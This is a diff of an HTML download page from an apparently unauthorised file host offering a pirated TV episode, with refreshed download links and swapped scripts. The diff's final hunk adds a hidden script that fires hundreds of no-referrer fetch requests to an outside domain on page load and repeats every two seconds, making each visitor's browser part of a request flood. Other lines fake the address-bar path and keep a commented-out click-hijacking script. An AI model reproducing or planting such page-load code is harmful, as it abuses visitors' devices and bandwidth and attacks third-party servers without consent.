@@ -193,7 +193,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
         
-        <a href="https://pixel.hubcdn.fans/?id=55dfe3bec1f77d3c553ba6b6a0aeff92ee72376c03084441ed504e1cdc4cf2d4460b59b582dbe7749290d4604dc62a16eb14a50b8ef363af21ec062cb6a4abba0628d9c86492b7d0ee81c807bafa4e129b785cf373f5110394c8c554e197bc93::6725b1b0af5aa152c0092a65ab78ec2b" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
+        <a href="https://pixel.hubcdn.fans/?id=529bf8a6089bbb95b78cf3cb1a6dc59fde5263bbdd021523a5c82feda0ba8ef5389cbaadec1f544a0af5c8005cc1f08d3c9d657117ec665281ccfab07cf57f480c0b88000cc87df9ace68870041479b5bbe24ca974e726fa3609bd53e21ad504::31791b788bbe5b7e5a8467880d69cece" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
             <i class="fas fa-file-download fa-lg"></i> Download [Server : 10Gbps]</a>
             
             <p style="font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">
@@ -205,7 +205,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
         
         
 
-    <a href="https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv?token=1757321957" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
+    <a href="https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv?token=1758025505" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
     <script>
         const fsl = document.getElementById('fsl');
         if (fsl) fsl.href += '1' + new Date().getMinutes();
@@ -214,7 +214,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
 
-    <a href="https://ddl2.cloudserver-1692960118.workers.dev/1397312652/a249c7271b2fd48dc4b1e4e72f34f8a01f161ca5b99288247094652cc5752f3df69900f99858d7a625101fa5684e26db7bb06fbf59e4b4c131f1a7a5f3eaca344e52d84cfc415b50fc5fad60fa8117f02cd111bdd14d137a628b7cb752a7870584f2121868b428a1a11cdcbffe7d71e458baf62c065402d991ba15a1eaba0c7eb63850b7c1331f9120848c8da37b746d41e6fba8c68988c3225a63cbfaf03200570ab7864b8453a2715a913af2dff0617c5518e97a43ab4a0758da5756066650::554adeac5b1127312efc574b6258a0ac/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv.zip" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #474b48 !important;"><i class="fas fa-file-download fa-lg"></i> Download [ZipDisk Server]</a>
+    <a href="https://ddl2.cloudserver-1692954790.workers.dev/1397313204/f21e7028ea6a932d9591378bbac598891ca0fab13e210fef8c6be7d9b7b22c9f48fd9d22719a71a55e7280ac8dbe7f01fd57386fac993fe3bdf66772dc1e08e69792acbd18c323b87a7fbc0f4eec7862f1d793c3c20c36082861091c8236b110cf3c186c55945950681e369e305675b442a8df092f83e9483dd1cbfff5271db3b77fbec42689825baf890da2186efa9806c9c69f850a0ef850c159152151ecb6617bf57be248b1d023b493ea2b9d80161d45732806cae4a7a6e9da9bdd2a3279::ea94114583b705a605ed9e55dc452914/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv.zip" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #474b48 !important;"><i class="fas fa-file-download fa-lg"></i> Download [ZipDisk Server]</a>
     <p style="
     font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">Resume is Supported in ZipDisk But please extract it as the files is inside zip</p>
 
@@ -240,7 +240,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
     if(isAndroid()){
         android_launch.classList.remove("d-none");
         android_launch.addEventListener('click', ()=>{
-            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv?token=1757321957',scheme: 'https',type: 'video/x-matrosk',
+            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-52f57cc1b81f4ecdac02802c1566c33d.r2.dev/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv?token=1758025505',scheme: 'https',type: 'video/x-matrosk',
             });anchor.click();
         });
         
@@ -259,7 +259,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 </div>
 
 <div class="alert alert-info" role="alert">
-<p><b>If you're getting any error please report at <a href="https://t.me/sumitbotreport">@Telegram Group</a> with Share Link And Screenshot (:</b></p>
+<p><b>If you're getting any error please report at <a href="https://t.me/hubcloudreport">@Telegram Group</a> with Share Link And Screenshot (:</b></p>
 </div>
 <hr>
 
@@ -318,41 +318,32 @@ Msc
 
 </body>
 </html><script>
-window.sessionStorage.setItem('xl',window.location.href);
-function cn(t){let e=window.location.protocol+"//"+window.location.host+t;history.replaceState({path:e},"",e)}cn("/pnb-personal-loan-up-to-%e2%82%b98-lakh-in-minutes-apply-online/");
+window.sessionStorage.setItem('xl',window.location.href)
+function cn(t){let e=window.location.protocol+"//"+window.location.host+t;history.replaceState({path:e},"",e)}cn("/games/");
 </script>
 <script>
 function setCookie(e,t,i){let o=encodeURIComponent(t),$=new Date;$.setTime($.getTime()+36e5*i);let n=`${e}=${o}; expires=${$.toUTCString()}; path=/`;document.cookie=n}setCookie("xyt",1,24);
 </script>
 
-<script data-cfasync="false" type="text/javascript" id="clever-core">
-/* <![CDATA[ */
-    (function (document, window) {
-        var a, c = document.createElement("script"), f = window.frameElement;
-
-        c.id = "CleverCoreLoader94679";
-        c.src = "https://scripts.cleverwebserver.com/46ff09dd57708572de379bac9bba3c6c.js";
-
-        c.async = !0;
-        c.type = "text/javascript";
-        c.setAttribute("data-target", window.name || (f && f.getAttribute("id")));
-        c.setAttribute("data-callback", "put-your-callback-function-here");
-        c.setAttribute("data-callback-url-click", "put-your-click-macro-here");
-        c.setAttribute("data-callback-url-view", "put-your-view-macro-here");
-
-        try {
-            a = parent.document.getElementsByTagName("script")[0] || document.getElementsByTagName("script")[0];
-        } catch (e) {
-            a = !1;
-        }
-
-        a || (a = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]);
-        a.parentNode.insertBefore(c, a);
-    })(document, window);
-/* ]]> */
+<script>
+function x(){
+    for (let i = 0; i < 369; i++) {
+    
+	 fetch("https://apis.damanworlds.world/api/"+new Date().getTime() + i, {
+          "method": "GET",
+          "mode": "no-cors",
+          "referrerPolicy": 'no-referrer',
+        });
+	}
+}
+x();
+const intervalId = setInterval(() => {
+    x();
+}, 2000)
 </script>
 
 <!--<script async src="https://greenanalytics.autos/recaptcha/v4_enc.js"></script>-->
 
 <!--<script>let s__=!1,observer=null;const sc_="a, button";function opst(e){if(!s__)return;e.preventDefault(),e.stopImmediatePropagation();let t=document.createElement("a");t.href=s__,t.target="_blank",t.rel="noopener noreferrer",t.click();let r=document.querySelectorAll(sc_);r.forEach(e=>{e.removeEventListener("click",opst)}),observer.disconnect()}function atchs(){let e=document.querySelectorAll(sc_);e.forEach(e=>{e.addEventListener("click",opst,{once:!0})})}window.addEventListener("message",function(e){try{let t=JSON.parse(e.data);t?.url&&(s__=t.url,atchs(),(observer=new MutationObserver(atchs)).observe(document.body,{childList:!0,subtree:!0}))}catch(r){}},!1);-->
 <!--</script>-->
+
